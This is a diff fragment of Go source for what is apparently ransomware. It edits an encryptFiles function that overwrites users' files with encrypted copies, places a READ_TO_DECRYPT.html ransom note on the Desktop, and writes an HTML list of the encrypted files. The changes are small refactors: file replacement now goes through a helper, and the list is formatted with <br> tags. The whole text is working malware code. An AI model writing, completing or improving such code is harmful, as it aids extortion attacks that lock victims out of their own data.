@@ -190,11 +190,11 @@ func encryptFiles() {
 						continue
 					}
 
-					//We need close the tempFile manually before proceed
+					// We need close the tempfile before proceed
 					tempFile.Close()
-					// Here we can use os.Rename to move the tempFile to the
-					// original file
-					err = os.Rename(cmd.TempDir+file.Name(), file.Path)
+
+					// Here we can move the tempFile to the original file
+					err = file.ReplaceBy(cmd.TempDir + file.Name())
 					if err != nil {
 						cmd.Logger.Println(err)
 						continue
@@ -255,7 +255,7 @@ func encryptFiles() {
 	ioutil.WriteFile(cmd.UserDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
 
 	// Write a list with all files encrypted
-	ioutil.WriteFile(cmd.UserDir+"Desktop\\FILES_ENCRYPTED.html", []byte(strings.Join(listFilesEncrypted, "\n")), 0600)
+	ioutil.WriteFile(cmd.UserDir+"Desktop\\FILES_ENCRYPTED.html", []byte(strings.Join(listFilesEncrypted, "<br>")), 0600)
 
 	cmd.Logger.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
 }
